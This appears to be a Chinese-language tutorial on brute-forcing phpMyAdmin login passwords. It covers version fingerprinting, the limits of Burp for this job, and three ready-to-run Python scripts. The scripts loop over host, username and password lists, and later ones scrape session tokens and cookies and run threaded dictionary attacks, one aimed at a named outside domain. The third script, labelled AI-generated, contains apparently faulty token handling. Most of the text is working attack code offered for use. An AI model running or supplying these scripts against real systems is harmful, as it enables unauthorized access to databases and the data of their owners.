## 版本查看

登录页面，查看源代码，搜索关键字：PMA_VERSION

## burp爆破

先抓包：

![](https://pic2.zhimg.com/80/v2-e7153d458754ded6c473ac2fffc90dd9_720w.webp)

开始加载字典爆破：

![](https://pic3.zhimg.com/80/v2-4149d547b6ec7ae692086d919cc80452_720w.webp)

返回的长度好多。。。

再看看正确密码的返回值：

![](https://pic1.zhimg.com/80/v2-f263240ca37a0e01fa5cdd45ed3833d0_720w.webp)

  

正确的密码和错误的密码。返回的包和长度都是一样，无法分别。

## 爆破脚本

4.8.5及以上版本

这些版本会多一个参数set_session

```
#!usr/bin/env python
#encoding: utf-8
#by i3ekr

import requests

headers = {'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Cookie':'pmaCookieVer=5; pma_lang=zh_CN; pma_collation_connection=utf8mb4_unicode_ci; phpMyAdmin=vo6nt8q71hsv93fb9a7c5b5oot2215gq'
        }
def attack(host,username,password):
    host = host + "/index.php"
    payload ={'pma_username':username,
          'pma_password':password,
          'server':'1',
          'target':'index.php',
          'token':'bf8e4192569617d39070c5739cd1776f'}
    try:
        html = requests.post(host,headers=headers,data=payload).text        
        if "themes/pmahomme/img/logo_right.png" in html:
            print "[-] %s-%s"%(username,password)
        else:
            print "[+] %s-%s-%s"%(host,username,password)
    except Exception as e:
        pass

with open('./url.txt','r') as url:
    host_t = url.readlines()
    with open('./username.txt','r') as username:
        username_t = username.readlines()
        with open('./password.txt','r') as password:
            password_t = password.readlines()
            for h in host_t:
                host = h.strip()
                for u in username_t:
                    username = u.strip()
                    for p in password_t:
                        password = p.strip()
                        attack(host,username,password)
```

5.*

差不多 5.几的版本，都需要验证 cookie 和 token，之前的爆破方式都无法在爆破了

```
#coding=utf-8
 
import requests 
import re
import html
import time
import sys
from concurrent.futures import ThreadPoolExecutor,as_completed
from tqdm import tqdm
 
url = "https://member.sss.com/phpmyadmin/index.php"
 
def crack_pass(passwd):
    req = requests.session()
    rep = req.get(url)
    token = re.findall(r'token" value="(.+?)"',rep.text)[0]
    token, sessions = html.unescape(token), rep.cookies['phpMyAdmin']
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}
    data = {
       "set_session": sessions,
       "pma_username":"root",
       "pma_password":passwd,
       "server":1,
       "target":"index.php",
       "token":token,
    }
    rep = req.post(url, data=data, timeout=60, headers=headers)
    reptext = re.findall(r'<div id="pma_errors"><div class="error"><img src="themes/dot.gif" title="" alt="" class="icon ic_s_error" />(.+?)</div>',rep.text,re.S)
    if "ShowDatabasesNavigationAsTree" in rep.text:
       print(rep.status_code,passwd)
       sys.exit()
    return 0
 
with open(r"F:\back\pass\pass.txt","rb") as f:
    pass_list = f.read()
    pass_list = pass_list.split()
 
start_time = time.time()
with ThreadPoolExecutor(20) as pool:
    to_do = []
    for passwd in pass_list:
       passwd = passwd.decode()
       to_do.append(pool.submit(crack_pass, passwd))
 
    for future in tqdm(as_completed(to_do), total=len(pass_list)):
       pass
 
print('总共耗时: {} '.format(time.time()-start_time))
```

AI生成的脚本：

当前版本的内存使用量很高

```
from tqdm import tqdm  
import requests  
import re  
import time  
from concurrent.futures import ThreadPoolExecutor  
  
url = "http://192.168.216.144/phpmyadmin/index.php"  
password_file = r"C:\WPS云盘\网络安全学习\0-工具包\字典\rockyou.txt"  
max_processes = 5  
  
  
def check_url(url):  
    try:  
        response = requests.get(url)  
        return response.status_code == 200  
    except requests.RequestException as e:  
        print(f"URL is not reachable: {e}")  
        return False  
  
  
def crack_pass(passwd):  
    try:  
        req = requests.session()  
        rep = req.get(url)  
        token_input = re.findall(r'<input type="hidden" name="token" value="(.+?)">', rep.text)[0]  
        token_value = re.findall(r'value="(.+?)"', token_input)[0]  
        headers = {  
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'  
        }  
        data = {  
            "pma_username": "root",  
            "pma_password": passwd,  
            token_input: token_value,  
        }  
        rep = req.post(url, data=data, headers=headers)  
        if "ShowDatabasesNavigationAsTree" in rep.text:  
            print(f"Found password: {passwd}")  
            return True  
    except requests.RequestException as e:  
        print(f"Error occurred while testing password: {e}")  
    return False  
  
  
def main():  
    if not check_url(url):  
        print("URL is not reachable.")  
        return  
    with open(password_file, "rb") as f:  
        pass_list = f.read().split()  
    total_passwords = len(pass_list)  
    with ThreadPoolExecutor(max_processes) as pool:  
        with tqdm(total=total_passwords, desc="Cracking passwords", dynamic_ncols=True) as bar:  
            for passwd in pass_list:  
                pool.submit(crack_pass, passwd)  
                bar.update()  
    print('总共耗时: {}'.format(time.time() - start_time))  
  
  
if __name__ == '__main__':  
    start_time = time.time()  
    main()
```